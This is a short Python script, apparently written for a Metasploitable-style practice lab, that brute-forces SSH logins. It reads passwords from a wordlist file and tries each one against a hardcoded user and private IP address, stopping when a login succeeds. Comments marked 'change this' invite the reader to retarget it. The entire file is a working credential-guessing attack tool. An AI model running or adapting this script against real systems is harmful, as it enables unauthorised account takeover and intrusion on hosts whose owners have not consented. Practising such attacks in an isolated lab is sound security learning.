from pwn import *
import paramiko

print("""
  ___________         .__  .__    _________                     .__                         
 /   _____/  | ____ __|  | |  |   \_   ___ \_______ __ __  _____|  |__   ___________  ______
 \_____  \|  |/ /  |  \  | |  |   /    \  \/\_  __ \  |  \/  ___/  |  \_/ __ \_  __ \/  ___/
 /        \    <|  |  /  |_|  |__ \     \____|  | \/  |  /\___ \|   Y  \  ___/|  | \/\___ \ 
/_______  /__|_ \____/|____/____/  \______  /|__|  |____//____  >___|  /\___  >__|  /____  >
        \/     \/                         \/                  \/     \/     \/           \/ 

                                                                                   by mavisec
        """)

username = "msfadmin" #change this
host = "192.168.195.129" #change this
attempts = 0

f = open('100.txt','r') #change this

for i in f:
    i = i.strip("\n")
    try:
        print("[{}] Attempting password: {}".format(attempts, i))
        response = ssh(user = username, host= host, password = i, timeout = Timeout.default )
        if response.connected():
            print(">> Valid Password: {}".format(i))
            response.close()
            break
        response.close()
    except Exception as e:
        print(e)
    attempts += 1
